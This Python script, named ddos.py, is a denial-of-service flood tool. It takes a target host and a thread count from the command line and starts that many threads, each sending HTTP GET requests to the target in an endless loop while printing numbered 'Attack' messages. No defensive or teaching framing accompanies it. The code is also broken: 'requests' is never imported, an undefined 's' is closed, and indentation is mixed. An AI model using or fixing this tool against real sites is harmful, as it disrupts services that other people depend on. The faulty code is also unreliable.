import threading, sys, time
from colorama import Fore

try:
	target = sys.argv[1]
	count = int(sys.argv[2])
except:
	print(f"{Fore.RED}Error!{Fore.RESET}")
	print(f"{Fore.CYAN}Using: {Fore.GREEN}ddos.py [TARGET] [COUNT]{Fore.RESET}")
	print(f"{Fore.CYAN}Example: {Fore.GREEN}ddos.py example.com 1000{Fore.RESET}")
	sys.exit(1)
attack_num = 0

def attack():
    while True:
	r = requests.get(target)
        global attack_num
        attack_num += 1
        print(f"{Fore.YELLOW}Attack №{attack_num}!{Fore.RESET} - {Fore.GREEN}{r.status_code}")
        
        s.close()

if __name__ == '__main__':
	print(f"Starting to DDoS {Fore.RED}{target}{Fore.RESET}!")
	time.sleep(3)
	for i in range(count):
		try:
		    thread = threading.Thread(target=attack)
		    thread.start()
		except:
			print(f"{Fore.RED}Error!{Fore.RESET}")
			continue
